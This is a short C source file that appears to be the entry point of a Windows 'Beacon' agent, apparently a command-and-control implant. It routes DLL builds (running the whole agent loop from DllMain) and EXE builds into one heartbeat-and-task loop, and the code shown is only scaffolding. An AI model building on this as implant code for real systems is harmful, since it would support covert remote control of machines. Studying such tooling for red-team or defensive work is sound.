#include "beacon.h"

#include <stdio.h>
#include <windows.h>

/*
 * 入口层只负责把不同构建形态统一到 BeaconRun：
 * - DLL 构建从 DllMain 进入；
 * - EXE 构建从 WinMain 进入；
 * - 业务初始化、心跳和任务循环都交给 Agent 层处理。
 */

#ifdef _DEBUG
/* 初始化调试控制台（附加到父进程或分配新控制台） */
static VOID DebugConsoleInit(VOID)
{
    FILE* stream;

    if (!AttachConsole(ATTACH_PARENT_PROCESS)) {
        AllocConsole();
    }

    SetConsoleCP(CP_UTF8);
    SetConsoleOutputCP(CP_UTF8);
    freopen_s(&stream, "CONIN$", "r", stdin);
    freopen_s(&stream, "CONOUT$", "w", stdout);
    freopen_s(&stream, "CONOUT$", "w", stderr);
}
#endif

/* Beacon 主入口：初始化 Agent 并运行主循环 */
INT BeaconRun(Agent* agent, PVOID image_base)
{
    INT rc;

    if (!AgentInit(agent)) {
        return -1;
    }

    agent->ctx.image_base = image_base;

    rc = AgentRun(agent);
    AgentFree(agent);
    return rc;
}

#ifdef BEACON_DLL_BUILD
BOOL WINAPI DllMain(HINSTANCE hInstance, DWORD reason, LPVOID reserved)
{
    Agent agent;

    (VOID)reserved;

    if (reason != DLL_PROCESS_ATTACH) {
        return TRUE;
    }

    DisableThreadLibraryCalls(hInstance);

    BeaconRun(&agent, hInstance);
    return TRUE;
}
#else
/* Windows GUI 应用入口 */
INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, INT nCmdShow)
{
    Agent agent;

#ifdef _DEBUG
    DebugConsoleInit();
#endif

    (VOID)hPrevInstance;
    (VOID)lpCmdLine;
    (VOID)nCmdShow;
    return BeaconRun(&agent, hInstance);
}
#endif
